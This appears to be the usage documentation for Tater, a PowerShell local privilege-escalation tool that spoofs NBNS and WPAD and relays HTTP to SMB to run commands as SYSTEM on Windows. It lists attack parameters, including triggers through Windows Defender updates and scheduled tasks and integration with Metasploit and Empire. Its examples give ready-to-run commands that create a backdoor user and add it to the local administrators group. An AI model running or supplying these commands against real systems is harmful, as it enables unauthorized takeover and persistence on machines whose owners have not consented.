Functions
Invoke-Tater
The main Tater function.
Parameters

1/6

IP - Specify a specific local IP address. An IP address will be selected automatically if
this parameter is not used.
SpooferIP - Specify an IP address for NBNS spoofing. This is needed when using two
hosts to get around an in-use port 80 on the privesc target.
Command - Command to execute as SYSTEM on the localhost. Use PowerShell
character escapes where necessary.
NBNS - Default = Enabled: (Y/N) Enable/Disable NBNS bruteforce spoofing.
NBNSLimit - Default = Enabled: (Y/N) Enable/Disable NBNS bruteforce spoofer
limiting to stop NBNS spoofing while hostname is resolving correctly.
ExhaustUDP - Default = Disabled: (Y/N) Enable/Disable UDP port exhaustion to force
all DNS lookups to fail in order to fallback to NBNS resolution.
HTTPPort - Default = 80: Specify a TCP port for the HTTP listener and redirect
response.
Hostname - Default = WPAD: Hostname to spoof. WPAD.DOMAIN.TLD may be
required by Windows Server 2008.
WPADDirectHosts - Comma separated list of hosts to list as direct in the wpad.dat file.
Note that localhost is always listed as direct.
WPADPort - Default = 80: Specify a proxy server port to be included in the wpad.dat
file.
Trigger - Default = 1: Trigger type to use in order to trigger HTTP to SMB relay. 0 =
None, 1 = Windows Defender Signature Update, 2 = Windows 10 Webclient/Scheduled
Task
TaskDelete - Default = Enabled: (Y/N) Enable/Disable scheduled task deletion for
trigger 2. If enabled, a random string will be added to the taskname to avoid failures
after multiple trigger 2 runs.
Taskname - Default = Tater: Scheduled task name to use with trigger 2. If you observe
that Tater does not work after multiple trigger 2 runs, try changing the taskname.
RunTime - Default = Unlimited: (Integer) Set the run time duration in minutes.
ConsoleOutput - Default = Disabled: (Y/N) Enable/Disable real time console output. If
using this option through a shell, test to ensure that it doesn't hang the shell.
StatusOutput - Default = Enabled: (Y/N) Enable/Disable startup messages.
ShowHelp - Default = Enabled: (Y/N) Enable/Disable the help messages at startup.
Tool - Default = 0: (0,1,2) Enable/Disable features for better operation through external
tools such as Metasploit's Interactive Powershell Sessions and Empire. 0 = None, 1 =
Metasploit, 2 = Empire

Stop-Tater
Function to manually stop Invoke-Tater.

Usage

2/6

To import with Import-Module:
Import-Module ./Tater.ps1
To import using dot source method:
. ./Tater.ps1

Examples
Basic trigger 1 example
Invoke-Tater -Trigger 1 -Command "net user tater Winter2016 /add && net localgroup
administrators tater /add"
Basic trigger 2 example
Invoke-Tater -Trigger 2 -Command "net user tater Winter2016 /add && net localgroup
administrators tater /add"
Two system setup to get around port 80 being in-use on the privesc target
WPAD System - 192.168.10.100 - this system will just serve up a wpad.dat file that will
direct HTTP traffic on the privesc target to the non-80 HTTP port
Invoke-Tater -Trigger 0 -NBNS N -WPADPort 8080 -Command "null"
Privesc Target - 192.168.10.101
Invoke-Tater -Command "net user Tater Winter2016 /add && net localgroup
administrators Tater /add" -HTTPPort 8080 -SpooferIP 192.168.10.100
